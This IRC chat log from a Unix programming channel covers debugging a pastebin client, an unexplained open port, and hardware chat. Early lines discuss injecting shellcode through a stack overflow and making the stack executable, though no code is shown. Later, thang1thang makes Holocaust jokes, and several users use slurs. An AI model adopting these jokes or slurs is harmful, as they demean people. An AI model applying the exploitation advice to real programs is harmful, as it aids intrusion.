22:18      bottomy │  no just ruby, but it's just a shellcode script so easy enough to follow. more important thing is where the shellcode is being written and the what the shellcode (asm) is
22:19       ripper │  I have used this thing since for some reason (I'm still learning so all I do is use pre-made code) putenv() wouldn't work :)\
22:19       ripper │  so I tried making the python thingy do the shellcode instead so it'd be all a copy paste or so

22:22       ripper │  Oh lemme see that :)
22:23       ripper │  Hmm
22:23      bottomy │  is it a fixed offset reference to the stack or are you obtaining the address to the stack through r/esp/bp?
22:23       ripper │  Obtained it through using esp
22:24   emptytapes │  god i love coconut
22:25      bottomy │  have you tried just debugging it (the process you're exploiting) when you inject the shellcode?

22:32      bottomy │  if you haven't already you'll also want to enable the stack as executable
22:32       ripper │  Oh I will try without that and if it doesn't work

22:32         yrmt │  yarmouth?
22:33       ripper │  in case things it is an un-executable stack
22:33        exaem │  yrmt: wut?
22:33       ripper │  BTW would you have any idea why putenv would simply not work and do nothing?
22:34      bottomy │  check the error?
22:34       ripper │  I remember(I'm sleepy so yeah) that there was no error
22:34       ripper │  the code executed well
22:34       ripper │  and when I tired printf $BUF
22:35       ripper │  well there was no variable called buf  lel :p
22:35      bottomy │  anyway most real world programs won't be vulnerable to stack based buffer overflows anymore, if they are vulnerable to overflows you usually have to get very creative to be able to run injected code.

01:33       fenriz │  hence my signing in and out.
01:34      bottomy │  not sure if that warning is suggesting it could be declared with noreturn or if it already is and it's saying something else :/?
01:34         yrmt │  void delete_file() __attribute__ ((noreturn));
01:35         yrmt │  this seemed to work
01:35         BigE │  fenriz: good thing i torrent all my TV shows
01:35         yrmt │  but after it says

01:36       fenriz │  no idea, my dad buys it
01:36      bottomy │  oh lol, you really shouldn't do everything cause it's also going to suggest using extensions (such as that noreturn, unless you were to use C11 no return _Noreturn I think it is)
01:36        dami0 │  NeoTerra, BigE: File opening works now. but I'm durping like mad on loops :P
01:36       fenriz │  but i hear they complain about the pric all the time.
01:36       fenriz │  BigE: they have all these exotic asian channels.
01:36         yrmt │  bottomy: but it throws warnings ;_;
01:37        dami0 │  fenriz: exotic channels from asia or channels of exotic asians?
01:37       fenriz │  hahaha
01:37       fenriz │  the former.

01:39        dami0 │  I dunno. it's not incrementing, just loop endlessly
01:39        dami0 │  I once used to actually know python
01:39       fenriz │  yo guys, if you say, have a script in bash that checks your gmail
01:39       fenriz │  which contains your email and your password in plaintext, is there a way of hiding it?
01:39         BigE │  dami0: paste it, lets see

01:39         BigE │  not in here
01:39         BigE │  but yeah
01:39        dami0 │  no, is embarassing
01:40         BigE │  then pm it to me
01:40        dami0 │  i know, im not that retarded
01:40      bottomy │  yrmt: just add	char token[10]; to the end of it
01:40        dami0 │  about the not in here
01:40        dami0 │  nah, ill try a little more. i think it might a dynamic variable thing
01:40         BigE │  lets just see it you pussy
01:41         quit │  exaem
01:41     NeoTerra │  dami0 did you open the file?

01:41         yrmt │  to the end of what
01:41        dami0 │  so, one loop now works
01:41        dami0 │  the file i was opening had \n's
01:42        dami0 │  I think it somehow screwed it up
01:42      bottomy │  don't add padding between it and filen, just simply move token to be the last member
01:42        dami0 │  anyway, lemme paste it
01:43        dami0 │  also, I'm intentionally not bothering with functions or anything

01:44         BigE │      i =+ i + 0.1
01:45         BigE │  that is not how you do that
01:45         BigE │  lul
01:45         BigE │  should be i =+ 0.1
01:45        dami0 │  lelp
01:45        dami0 │  I had that the right way
01:45     NeoTerra │  the incrementor isn't the issue, he has no nexLine() thing
01:45        dami0 │  changed it right on one way
01:45         yrmt │  typedef struct { char *filen; char *ftype; char *fpath; char token[10];

01:45         BigE │  that too
01:45         yrmt │  with new lines
01:46     NeoTerra │  damio you need f.next() somewhere in your loop
01:46     NeoTerra │  so it reads the next line in the file
01:46     NeoTerra │  *dami0
01:46        dami0 │  it works with i = i + 1
01:47        dami0 │  well, the inner loop works, the outer doesn't. but, what?
01:48         BigE │  yeah, you have to do i = i + 1, or i += 1
01:48         BigE │  or i++

01:48         BigE │  i have never used it
01:48         BigE │  lul

01:49         BigE │  i always just use for loops for stuff like this

01:49        dami0 │  ok, see, inner loop now woks like intended. file is actually printed to
01:49         jmbi │  yeah
01:49         yrmt │  I simply used a flex patch to remove animations before
01:50        dami0 │  but no outer loop, :<
01:50         jmbi │  i wonder if there are any other tweaks
01:50         yrmt │  but now it's faster everywhere
01:50        dami0 │  could probably go for for
01:50         yrmt │  jmbi: do the flex tweak

01:56         yrmt │  jmbi: you have to make the patch yourself
01:56         jmbi │  oh, lol
01:56         yrmt │  bottomy: but then it says that I don't need a packed array
01:57      bottomy │  it's just saying the first 3 pointers don't need to be packed (which they don't since they already are)
01:57      bottomy │  but there's no way around that since you're specifying the struct to be packed
01:57         yrmt │  well, fuck -Weverything
01:57         yrmt │  :p
01:58      bottomy │  lol

02:00        exaem │  NeoTerra: nevermind, i'm awesome and fixed everything
02:00      bottomy │  like those 2 warning the padding and the packed, they're just letting you know things you don't have to listen. for instance there are cases where extra padding to make the struct meet the alignment boundary is a good thing
02:00         yrmt │  exaem: lel
02:02     NeoTerra │  exaem, all good lol

02:03        dami0 │  f.next is for files open for reading
02:05        dami0 │  lel, what this does is run the inner loop then the outer one.

03:26         shix │  then watch evil dead
03:26         BigE │  the latest one is even worse
03:27         BigE │  actually, the most realistic looking CGI in the whole film was the dragon
03:27         BigE │  which was well done
03:27         BigE │  everything else just looks lazy and shitty
03:27         BigE │  IMO
03:27         BigE │  there were like 5 shots in the entire movie that were not CGI
03:27         BigE │  which is sad
03:28         shix │  evil dead has no cgi at all from what i've heard

04:30     NeoTerra │  this is frightening
04:30         dcat │  it's his home connection
04:30         dcat │  probably some isp remote control shit
04:30         dcat │  well this is odd.
04:31         dcat │  it only replies if there's >= 10 bytes
04:31         dcat │  it's probably some sort of authentication
04:31         dcat │  but for 10 bytes that's really short
04:34         jmbi │  it must be some isp shit
04:34         jmbi │  i have no idea where it's coming from
04:34         dcat │  it would be interesting to crack it though
04:35         BigE │  could it be a backdoor?
04:35         dcat │  maybe.
04:35         BigE │  or do you have upnp or something enabled?
04:35         shix │  i bet its something jmbi planted there on purpose

04:36     NeoTerra │  ^
04:37         BigE │  if nothing is using it, it is probably a router thing
04:37         dcat │  it's probably his router, not his server.
04:37         BigE │  maybe an admin page
04:37         dcat │  we could use analouge hacking to crack it
04:37         dcat │  potentially
04:39         quit │  shorefire
04:43         jmbi │  its not the server
04:43         BigE │  yeah, so it must be the router

04:44         jmbi │  sure
04:44         jmbi │  i'm sure it'll be something stupid
04:44         jmbi │  like a version number or something
04:44         dcat │  lel
04:44     NeoTerra │  has anyone tried googling the output?
04:44         dcat │  yes
04:44         dcat │  all I get is turkish shit
04:46         BigE │  yeah, we are probably on a watch list now

04:47     NeoTerra │  yeah me too lul
04:47         dcat │  only other thing I can think of is UPnP
04:49         BigE │  that was my thoughts earlier as well
04:49         BigE │  if there is nothing on netstat, it is pretty much guaranteed to be a router thing
04:51         BigE │  and high in the port range suggests either upnp or an isp router thing

04:53         BigE │  i like your hostname
04:53        h4kkr │  Maybe we should hack together sometime.

04:55         jmbi │  BigE: nothing is coming up
04:56         BigE │  then it must be your router
04:56         jmbi │  alrighty
04:56         BigE │  you could double check by running wireshark on the LAN for a few hours and make sure the port doesnt get used
04:57         jmbi │  also, the irc server has used 5GB of bandwidth in 23 days
04:57         BigE │  so about 6GB a month
04:57         BigE │  i could do that off my home connection
04:57     NeoTerra │  jmbi what kind of router do you have?
04:57         BigE │  lul
04:57         jmbi │  probably less too, since we just got rid of that ~100 botnet

05:15  thang1thang │  bspwm
05:15  thang1thang │  I just opened my bspwmrc and you can add in a "cursor follow window" tag and set it to "false". Works like a charm
05:16  thang1thang │  that coupled with a thing that I have inside my .xinitrc that disables the mouse while typing (and .5 seconds after typing ceases) allows me to pretty much never have to worry about random pad presses anymore
05:16  thang1thang │  only thing I have left to really fuck with is my audio...

05:22         BigE │  god i like the curl library
05:22  thang1thang │  How fast is it really? It's running an atom processor fah christ's sake
05:22         BigE │  it seems pretty good
05:23         dcat │  BigE: yeah, it's awesome
05:23  thang1thang │  my dad would be using it mostly for web browsing and some accounting stuff so I'm not _too_ worried about whether it'll be a beast or not, but it just seems like it'd be slow as shit
05:23         dcat │  kind of unusual in C at first, but it makes a lot of sense
05:23      jjumbii │  ive honestly experienced 0 lag, ive been watching 1080p movies while browing with chrome
05:23  thang1thang │  considering most of the shitty netbooks were running atom processors
05:23  thang1thang │  ooh nice. Not bad
05:23  thang1thang │  do you find the 2GB ram to be limiting at all?
05:23      jjumbii │  its snappy as fuck
05:23      jjumbii │  and no
05:24      jjumbii │  what could you be doing on an 8 inch tablet
05:24  thang1thang │  how many tabs do you usually have on chrome while running the videos? (It's a full version of windows, right? I'm pretty sure the dell venues are running W8 full rather than RT but I'm just double checking)
05:24  thang1thang │  What could you be doing on an 8 inch tablet? Well what I would be doing on a tablet is I would be running photoshop and using a stylus 
05:25      jjumbii │  about 5 or so
05:25      jjumbii │  and its a full version
05:25      jjumbii │  so you could install photoshop
05:25  thang1thang │  5 or so? Well he's not a total media whore so yeah that'll be good, esp if it's 5 and 1080p video at the same time
05:25      jjumbii │  yeah
05:25  thang1thang │  and lol. I'll be damned if I'm going to run photoshop on an atom CPU and 2GB of ram
05:25      jjumbii │  plus, its $300
05:25         shix │  so anythning happen
05:26  thang1thang │  I've made photoshop crash from overloading my system on a mac w/8GB of ram and a dual core i7...
05:26         dcat │  BigE: are you safe that I'm not trying to trick you into installing a backdoor now?
05:26      jjumbii │  lol
05:26  thang1thang │  BigE
05:26  thang1thang │  cmmer boi
05:26  thang1thang │  imma install a backdoor into you so hard... ;3
05:26      jjumbii │  also, the battery life is pretty good
05:27  thang1thang │  It's not the full 8 or 9 hours they bullshit you with, right?
05:27      jjumbii │  ive used it for 9 hours straight watching 1080p movies and reading pdfs
05:27         dcat │  taking the backdoor is my gf "brilliant" codeword for anal
05:27         BigE │  that is everyones code
05:27         BigE │  not hers
05:27         BigE │  lul
05:27  thang1thang │  huh, so dell actually delivered?
05:27         dcat │  really?
05:27  thang1thang │  color me impressed
05:27         BigE │  yes dcat 
05:28      jjumbii │  haha, its a nice piece of hardware
05:28      jjumbii │  mxtm just bought one as well
05:28      jjumbii │  cant wait to get linux on it
05:28         dcat │  I was so proud to have a gf that wasn't as straightforward as the rest ;_;
05:28         shix │  jjumbii: reading books is so much better with the audiobook
05:29         BigE │  lul
05:29         mxtm │  jjumbii, it is SO GOOD
05:29         mxtm │  IT IS PERFECT
05:29         mxtm │  I love
05:29      jjumbii │  chill now before i kick you
05:29      jjumbii │  fucking windows 8 fanboy
05:29      jjumbii │  jk
05:29         shix │  would be cool to have lunix on it
05:30      jjumbii │  shix, but, on a tablet, eh...
05:30         dcat │  should I go for win7 or win8?
05:30      jjumbii │  7
05:30  thang1thang │  windows 8
05:30         dcat │  (I have to pick one)
05:30  thang1thang │  windows 8 uses less than half the ram of 7 on average
05:30  thang1thang │  runs faster on less CPU cycles
05:30  thang1thang │  and the "only" thing wrong with it is the fucking start menu
05:30  thang1thang │  who gives a shit about start menu?
05:31         dcat │  I do
05:31  thang1thang │  The other thing you'll run into is some older software made for XP or whatever won't run as nice on W8 as it will on W7 so W8 has less compatibility 
05:31         BigE │  dcat: besides a severe lack of any sort of documentation, i see nothing wrong with it
05:31         dcat │  lel yeah
05:31         BigE │  no calls to getpid() or anything :P
05:31  thang1thang │  You can install a 3rd party software to give you the start menu back
05:31         shix │  BigE: you run w8?
05:31         dcat │  some of the functions should be entered to the ioccc
05:31  thang1thang │  and if you hit the start button on W8, and start typing, it'll search normally just like in windows 7
05:31         BigE │  lol no shix 
05:32         shix │  me either lul
05:32  thang1thang │  so starting the cmd prompt from the normal OS is the same exact process for me. I don't even notice the difference w/the start menu vs the start page much since I don't really ever use the start page
05:33  thang1thang │  tl;dr: If you're going to run old shitty incompatible propriatary software, get W7. If you're wanting to get the most performance out of your comptuer, use linux. If you want a healthy balance between the two, Windows 8
05:33         shix │  Those aren't options. Plan 9 master race
05:33        tbuck │  dcat: what am i doing wrong?
05:34         shix │  jk
05:34         dcat │  ?
05:34        tbuck │  cc: error: unrecognized command line option ‘-Weverything’

05:34        tbuck │  lol
05:34         dcat │  just change it to -Wall
05:34        tbuck │  mk
05:34         BigE │  yeah, this program hates me as well
05:35         dcat │  BigE: the makefile?
05:35         dcat │  or ioup?
05:35         BigE │  why will it not find curl
05:35         BigE │  lul
05:35         dcat │  which distro?
05:35         BigE │  i just bypasses the make file
05:35         BigE │  debian
05:35         BigE │  been a while since i did curl shit
05:35         dcat │  does it not find the lib or headers?
05:35        tbuck │  dcat: so i can just `echo "test paste" | ioup -0`?
05:36        tbuck │  seg faults
05:36         dcat │  goddamn what is going on?
05:36         dcat │  lots of people are getting segfaults
05:36      jjumbii │  http://i.imgur.com/23afv6m.png
05:36         dcat │  do any of you guys know how to debug?
05:38         shix │  jjumbii: not enough terminals
05:38        tbuck │  my debuging technique isnt very good. usually just throw print statements around to see how far it goes and narrow down where its segfaulting
05:38         dcat │  oh.
05:38         dcat │  have you ever used gdb?
05:39        tbuck │  nah
05:39         dcat │  strace?
05:39        tbuck │  i wish they taught us this shit in school
05:39         dcat │  :/
05:39        tbuck │  im a bit familiar with strace
05:39         dcat │  well, try strace
05:39         dcat │  see if you figure anything out
05:39         dcat │  if not
05:40         dcat │  gdb ioup
05:40         dcat │  > run insertfilehere
05:40         dcat │  and see what pops up
05:41         dcat │  this sucks
05:41         dcat │  I can't reproduce
05:41  thang1thang │  damnit, irssi won't let me scroll the chat ;-;
05:41         dcat │  ctrl-p

05:42        tbuck │  dcat: heres the strace if you want to see it
05:42         dcat │  vypr: everyone else is segfaulting too
05:42        tbuck │  http://paste.unixhub.net/index.php/ZWrL
05:42         vypr │  dcat: wat
05:42  thang1thang │  ctrl p/n just go to the top/bottom of the chat with no scrolling in between
05:42         vypr │  lemme see if i am
05:42         dcat │  broken pipe?
05:42         dcat │  dafuq
05:42  thang1thang │  they also swap between windows if I hit them while at the bottom/top of a page
05:43         dcat │  try just upping a file
05:43  thang1thang │  maybe my irrsirc settings are weird...
05:43         dcat │  ioup file
05:43         BigE │  and the token is invalid
05:43         vypr │  dcat: There's only a segfault when an invalid file is loaded.
05:43         vypr │  but if I do a png, its fine.
05:44         BigE │  why is my token invalid dcat ?
05:44         dcat │  hmmmm...
05:44         vypr │  BigE: Probably entered it wrong in Makefile.
05:44         dcat │  what about if the file has no extension?
05:44         vypr │  dcat: Breaks.
05:44         BigE │  i entered nothing into the makefile
05:44         vypr │  I tried a python file and that broke aswell.
05:44         vypr │  BigE: There's the problem.
05:44         vypr │  Edit the line that has "TOKEN = noway"
05:44         vypr │  replace noway with your token.
05:44         vypr │  if you have one.
05:45         BigE │  i dont have one....
05:45         vypr │  dcat: ^
05:45         dcat │  pm me your email
05:45         BigE │  just send me a token, i dont have an email to give you
05:45  thang1thang │  you don't have email because
05:45         vypr │  dcat: generate one and pm him it.
05:45  thang1thang │  wait lemme guess
05:45  thang1thang │  da illuminati 
05:45         BigE │  i have a personal email
05:45         BigE │  that is it
05:45  thang1thang │  they terk ur securrhity
05:46         dcat │  it doesn't store the email
05:46         dcat │  it's just an automated system for sending the token
05:46  thang1thang │  make a 10 min email online
05:46  thang1thang │  they have email accounts that expire after 10 mins. It'll send it before that
05:46         dcat │  and it's really great, cause chances are, you're gonna lose it.
05:46         BigE │  dcwiruk+pxgkw0@sharklasers.com

05:52         dcat │  I'll try to fix as soon as I'm done eating
05:52         BigE │  also, it still tells me the token is invalid
05:55         dcat │  did you put quotes around it?
05:55         BigE │  no
05:55         BigE │  i will though
05:55         dcat │  no don't

05:56         vypr │  BEEDO BEEDO BEEDO BEEDO
05:57  thang1thang │  how do you install it if there's no makefile? ._.
05:57  thang1thang │  maybe I'm just being slow 'cause tired...
05:57        tbuck │  thers a makefile, but otherwise youd just throw it in your bin
05:58        tbuck │  or run it from where you built it
05:58  thang1thang │  I don't see a make file in there o.O
05:58  thang1thang │  maybe I cloned the wrong directory by mistake?
06:03         dcat │  okay guys
06:03         dcat │  eating
06:03         dcat │  did someone have problems on debian?
06:04  thang1thang │  just to double check, y'all cloned it from https://github.com/UnixHub/UnixHub-Pastebin-Client right?
06:05         vypr │  thang1thang2: Our ioup is custom made.
06:05        tbuck │  thang1thang2: thats the unixhub pastebin client
06:05  thang1thang │  figured
06:05        tbuck │  we testing dcats
06:05  thang1thang │  oh... found the ioup project, kept looking for a pastebin named project
06:05         BigE │  token doesnt work
06:05  thang1thang │  well now I feel stupid
06:05         BigE │  that is my problem
06:05         BigE │  lul
06:06  thang1thang │  knew it was something stupid
06:07         dcat │  thang1thang2: it's not on github
06:07         dcat │  git.unixhub.net
06:07  thang1thang │  yeah I found the right git now
06:07         vypr │  thang1thang2: http://git.unixhub.net/dcat/ioup
06:07  thang1thang │  I was looking for something named "pastebin" something or another
06:07  thang1thang │  forgot it was named ioup
06:07  thang1thang │  I'm customizing the makefile now :)
06:08  thang1thang │  makefile's breaking on the -Weverything in your flags in the make file
06:08        tbuck │  change everything to all
06:08         quit │  vypr
06:09  thang1thang │  hmm
06:10  thang1thang │  in that same line he had both -Wall and -Weverything. 
06:10  thang1thang │  I'm assuing -Wall is for certain distros and -Weverything for others?
06:10        tbuck │  i think it was just a goof
06:10         dcat │  nah it's yrmt
06:10         dcat │  -Weverything is on osx
06:10  thang1thang │  lol alright, sounds like one
06:10         dcat │  I'm guessing cause of clang
06:10  thang1thang │  ahhh okay
06:10        tbuck │  oh osx thing
06:11  thang1thang │  -Weverything sounds more like a BSD thing vs an OS X only thing
06:11  thang1thang │  but yeh clang's probably the reason
06:11  thang1thang │  you could force it to use a different compiler on OS X though?
06:11  thang1thang │  might want to put a detect distro/OS in the make file so it'll only run the -Weverything if it detects clang
06:12  thang1thang │  unless I'm the only one that had the problem with -Weverything breaking the make?
06:12         quit │  shix
06:12         BigE │  no, i had to change to all
06:13  thang1thang │  Okay. Putting a detect OS/Compiler will fix that problem and make it so OS X and linux can run it. That's not a big deal
06:15  thang1thang │  a small script to ask for the token would also make the install of ioup more idiot friendly. Just something I'd do if I were planning on making it available for everyone
06:17         dcat │  thang1thang2: I don't want idiots to use it ;P
06:17        tbuck │  he does mention it in the readme
06:17  thang1thang │  >implying people read README files
06:18         dcat │  I didn't before
06:18  thang1thang │  I never used to read readme files
06:18  thang1thang │  until I made linux my main OS
06:19  thang1thang │  now it's document pages, man pages and readme files all over the place
06:19     NeoTerra │  yeah man pages and documentation are your friends
06:20         BigE │  NeoTerra: too bad day-z using arma II is dead, the game is on sale now
06:20         BigE │  lul
06:20     NeoTerra │  you should get it anyways, it's got lots of user missions
06:21         BigE │  i already own arma 3, no point in buying more games
06:21         BigE │  unless you think just buying the base game is good enough
06:21  thang1thang │  DayZ is a mod for arma 2?
06:22         dcat │  uhh
06:22         BigE │  yes
06:22  thang1thang │  isn't dayz like the gary's mod of tf2?
06:22         dcat │  is anyone else having connection issues with git.unixhub.net?
06:22  thang1thang │  oh nvm, even better
06:22  thang1thang │  award winning mod for a game. Not that the game's award winning... lol
06:23  thang1thang │  do I need a pastebin account to use ioup?
06:24         dcat │  you need the token
06:24         dcat │  that's it.

06:26     NeoTerra │  garry's mod was a mod for the source engine
06:26  thang1thang │  yeh I know
06:26     NeoTerra │  way before tf2 was even popular
06:27  thang1thang │  I just always reference tf2 because that's the only way 99% of my gamer friends seem to know gary's mod
06:27  thang1thang │  my dad called Windows "IBM" for about 5 minutes because he was thinking of his laptop and forgot that windows was the name of the OS
06:27  thang1thang │  and we were inside a microsoft store
06:27  thang1thang │  surrounded by windows 8 tablets, and windows 8 phones
06:32  thang1thang │  made a myTesting.txt file
06:32  thang1thang │  typed: ioup myTesting.txt
06:33  thang1thang │  got: segmentation fault (core dumped) ioup -0 myTesting.txt
06:33  thang1thang │  nvm. That was when I tried ioup -0 myTesting.txt
06:33  thang1thang │  but I got the same error (core dumped) both times
06:34         mxtm │  good night guys
06:34         quit │  mxtm
06:34  thang1thang │  ight
06:34  thang1thang │  night*
06:37  thang1thang │  yeah, can't fix the seg fault ._.
06:38         dcat │  bros.
06:38         dcat │  I think I might've found it
06:38        tbuck │  bruh
06:38        tbuck │  noice
06:38  thang1thang │  niice
06:38  thang1thang │  what was it?
06:39         dcat │  may I direct your attenshun at line 85
06:39  thang1thang │  in the make or the ioup.o or ioup.c?
06:39         dcat │  ioup.c
06:39         dcat │  f.ftype = ! f.ftype ? "text/plain" : f.ftype;
06:39         dcat │  f.ftype = ! f.ftype ? f.ftype : "text/plain";
06:39         dcat │  swap those and try
06:40         dcat │  I could be wrong
06:41        tbuck │  nawp sorry
06:41         dcat │  hm
06:41         dcat │  try uploading a file
06:41         dcat │  for me it works with files
06:41         dcat │  but not stdin
06:41        tbuck │  yeah thats what im doing now
06:41  thang1thang │  are you using the f.ftype fix?
06:41        tbuck │  mhm
06:42  thang1thang │  and does the file have to have no extension? My test file is *.txt so I just wanna make sure the extension isn't breaking it
06:42        tbuck │  it shouldnt matter really
06:42         dcat │  the thing that is really breaking it is line 100
06:42         dcat │  so you can just comment that out for now
06:42         dcat │  and if you guys are up for it, we can fix it
06:44  thang1thang │  sure
06:44  thang1thang │  I'll probably be mucking around with the system sound while I'm doing it though, and I'm not super experienced at coding so I might not be much help
06:53  thang1thang │  okay. Make clean was failing for me because I didn't sudo make uninstall first. Not that it's a big deal, I should've done that in the first place
06:54  thang1thang │  okay. Commented out line 100, did the line change at 85 and I'm still getting a segmentation fault
06:54         dcat │  hm
06:54         dcat │  which distro are you using again?
06:54  thang1thang │  arch linux
06:55  thang1thang │  I'm hardcore like that. If I'm going to learn linux I'm gonna go ballz ta da wallz
06:55         dcat │  lel
06:56  thang1thang │  besides
06:56  thang1thang │  it's fun to take 3 hours to set your wifi up the first time you boot...
06:56         dcat │  lelel
06:56         dcat │  that's a great way of putting it
06:56  thang1thang │  apparently my mac's wifi works out of the box
06:56  thang1thang │  except it didn't because something or another wasn't in the install
06:57  thang1thang │  so I installed 2-3 different versions of the b43 driver and I uncommented/commented stuff out of files
06:57  thang1thang │  and after about 3 hours apparently the only thing I had needed to do was add in "load every single file related to wifi ever made in the history of mankind that's insatlled wiith Arch" into the init files of Arch itself
06:58  thang1thang │  so had I known what I was doing I probably would've fixed it in 10 minutes :p
06:59  thang1thang │  I think one of my favorite things about bspwm and other wm's like it is the fact that I can hit cmd+1-9 to just go to a new screen instantly
07:00  thang1thang │  It's like the old os x's version of Spaces
07:00  thang1thang │  only 500x more useful
07:01         dcat │  okay
07:01         dcat │  go get newest ioup
07:01         dcat │  git pull
07:01        tbuck │  aight
07:03         dcat │  and let me know if it works
07:03        tbuck │  :(
07:03         dcat │  for me it worked on debian 64bit
07:03         dcat │  noooooo
07:03        tbuck │  seg fault
07:03         dcat │  can you backtrace in gdb?
07:03         dcat │  $ gdb ioup
07:03         dcat │  > run testfile
07:03         dcat │  > backtrace
07:04        tbuck │  http://paste.unixhub.net/index.php/x1807
07:05         dcat │  can you add this to the end of each formadd function;
07:05        tbuck │  thanks for teaching me some gdb btw lol
07:05         dcat │  puts("1");
07:06         dcat │  and increasing number for each one
07:06         quit │  Jayro
07:07        tbuck │  as a last arg in each curl_formadd?
07:07         dcat │  no
07:07         dcat │  as in after it
07:07        tbuck │  mk
07:07         dcat │  curl_formadd([...]); puts("1");
07:07        tbuck │  yeah i get it now
07:08        tbuck │  prints 1 then segfaults
07:09         dcat │  can you try commenting out line 99 too?
07:10        tbuck │  same thing
07:11         dcat │  are you using ext4?
07:11        tbuck │  yeahp
07:11         dcat │  then I'll have to consult with bottomy or something
07:11        tbuck │  yeah ive only written simple programs in C i cant be much help
07:11         dcat │  :\
07:11         dcat │  oh well
07:12  thang1thang │  real quick how to overwrite changes when pulling?
07:12         dcat │  on the positive side, it works on debian
07:12        tbuck │  nice, thats weird tho :/
07:12  thang1thang │  lol
07:12         dcat │  how to overwrite your own changes with the ones from  the repo?
07:13  thang1thang │  yeah
07:13         dcat │  either git stash or just rm the file
07:13  thang1thang │  ah okay, didn't know what stash would do so I wanted to make sure I wouldn't break anything on your side (overly paranoid about that)
07:14  thang1thang │  ran: ioup myTesting.txt
07:14  thang1thang │  still got seg fault. I'm writing the command correctly yes?
07:15         dcat │  yeah
07:15         dcat │  try from stdin
07:15         dcat │  ioup -0
07:15  thang1thang │  okay. I gotta uninstall and remake
07:15  thang1thang │  i was stupid and forgot to re-edit the makefile to put my token in
07:17         dcat │  BigE: are you on debian?
07:18  thang1thang │  okay remade it correctly
07:18  thang1thang │  still got a seg fault
07:19  thang1thang │  whenever I hit ^D to post, it closes the term window, makes a new one and the new one becomes unresponsive to text input or normal commands
07:19  thang1thang │  (pretty sure that's result of my wm shortcuts)
07:20         dcat │  sweet
07:20         dcat │  norway is changing abortion politics
07:20         join │  kori
07:20         mode │  +v kori
07:21         quit │  thang1thang2
07:21         BigE │  dcat: yes I am
07:21         dcat │  can you pull and try again?
07:22         join │  thang1thang2
07:22         mode │  +v thang1thang2
07:22  thang1thang │  well, also weird
07:23         dcat │  ?
07:23  thang1thang │  I sent the unresponsive terminal to another window
07:23  thang1thang │  and just spammed random shortcuts trying to get it to close
07:23  thang1thang │  somehow managed to get the entire system to freeze I think, anyway I had to restart the computer since no shortcuts were working
07:23         dcat │  is bspwm xcb?
07:24  thang1thang │  think so
07:24         BigE │  dcat: so all i have to change is the token, right?
07:24         BigE │  in the make file, before i compile it
07:24  thang1thang │  yeah
07:24         BigE │  okay, so that is done
07:24         BigE │  and i still get invalid token error
07:24  thang1thang │  yeah bspwm has xcb as a dependency
07:24         part │  kori
07:25         dcat │  invalid token?
07:25  thang1thang │  da hell. Running firefox from dmenu gives me firefox in a really fricking tiny window...
07:25  thang1thang │  but moving the window around fixes it. That's funny
07:25         dcat │  BigE: can you check that the token is 10 chars long?
07:26         BigE │  it is
07:27         dcat │  can you try with the web frontend?
07:27         dcat │  http://pub.iotek.org/
07:28         BigE │  works
07:28         dcat │  does it say "[server] invalid token" or just "invalid token"?
07:28         BigE │  just invalid token
07:28         dcat │  hm
07:29         dcat │  that's the client
07:29  thang1thang │  mine does when I use pub.iotek
07:29  thang1thang │  ooh gotta put the token in the first box eh?
07:29         dcat │  it only checks for the length of the token and it's wrong
07:29         dcat │  doublecheck your makefile
07:30  thang1thang │  okay, I put the token in, it works
07:30         dcat │  sweet
07:30  thang1thang │  only on web side
07:30  thang1thang │  http://pub.iotek.org/p/kKykHzv
07:30         dcat │  then click IOPaste and you can see your files
07:30         dcat │  lul
07:31  thang1thang │  IOPaste?
07:31         BigE │  there is nothing wrong with my make file
07:31         BigE │  all i did was replace the dummy token with mine
07:31         dcat │  check for padding and such
07:31         BigE │  there is none
07:31         BigE │  already checked
07:32  thang1thang │  hmm
07:32         dcat │  hmm

07:33         BigE │  lul
07:33  thang1thang │  lol
07:33         dcat │  oh 
07:33  thang1thang │  of course it was a misclick
07:33         dcat │  was that intentional BigE?
07:34  thang1thang │  just like hitler misclicked 6 million jewz rite?
07:34         dcat │  lel
07:34  thang1thang │  (I'll shut up now)
07:34         dcat │  glass of juice
07:34  thang1thang │  it turns out hitler loves jews
07:34  thang1thang │  unfortunately he had a stutter
07:35   Neuromatic │  dcat: dats muh world :D
07:35  thang1thang │  and nobody could understand him when he said "kill 6 million juice trees"
07:35         dcat │  lel Neuromatic 
07:35         BigE │  if there is nothing i can do, then just tell me and i will stop bothering
07:35  thang1thang │  apparently they thought he said "kill 6 million jews please"

07:44         dcat │  nah
07:44         dcat │  I'm a psychopath
07:44  thang1thang │  retired? (I thought I remembered you mentioning grandkids)
07:44         dcat │  lel
07:44  thang1thang │  could've been someone else, my memory ain't the best
07:44         dcat │  I'm technically still at work
07:44         dcat │  still getting paid
07:44  thang1thang │  doctorevilquote.jpg
07:45         dcat │  I made a program that replaced me, my collegues, and my boss.
07:45  thang1thang │  nice
07:45  thang1thang │  what do you "do" at work?
07:45     NeoTerra │  dcat I don't think you know what psychopath means...
07:45     NeoTerra │  I think you mean psychologist
07:45         dcat │  lel
07:46  thang1thang │  There was someone on reddit who made a script that did his entire job for him, and did it hundreds of times faster than his coworkers could get it
07:46  thang1thang │  since they had an "incentive pot" at the work (top 10 workers got a percentage of the pot which was fairly big) 
07:46         dcat │  NeoTerra: nah
07:46  thang1thang │  he was doing something like 98% of all the work in the room because of his script
07:46         dcat │  I have a cluster b personality disorder
07:46  thang1thang │  so his salary almost doubled xD
07:47         dcat │  coupled with LLI and depersonalisation
07:47  thang1thang │  so
07:47  thang1thang │  isn't that sociopath though?
07:47  thang1thang │  psychopath would include tendancies towards chaos e.g. murdering and rape or whatever rather than tendiencies to self-harm e.g. programming
07:48         dcat │  basically means that if I ever go to prison, I have to be kept in solitary confinement
07:48  thang1thang │  why, though? o.O
07:49  thang1thang │  because you're likely to go crazy and kill someone?
07:49         dcat │  not neccesarily
07:49         dcat │  it just means that I wouldn't feel anything if I did
07:49  thang1thang │  ah got it
07:49         dcat │  which is really weird
07:49  thang1thang │  I dunno if I suffer from depersonalization or any of that stuff but... stuff that bothers others? Really doesn't bother me at all, idk
07:50  thang1thang │  and a lot of people think seriously about murdering others while in prison, it kinda brings out the worst in you
07:50         dcat │  cause of my LLI, I don't care that much about me, and constantly want to help others
07:50  thang1thang │  the fact that you suffer from depersonalization and thus wouldn't feel anything means ( I think ) that you'd be quite likely to develop sociopathic and psychopathic disorders
07:50  thang1thang │  nice
07:50  thang1thang │  totally means you'll kill someone
07:50         dcat │  also means that my brain is in overdrive at all times, so I'm very good at strategy
07:51  thang1thang │  "I can make the pain go away, shhh... shhh... no more tears now..."
07:51         dcat │  lel pretty much
07:51         dcat │  as a kid I jumped infront of an explosion to save my friend
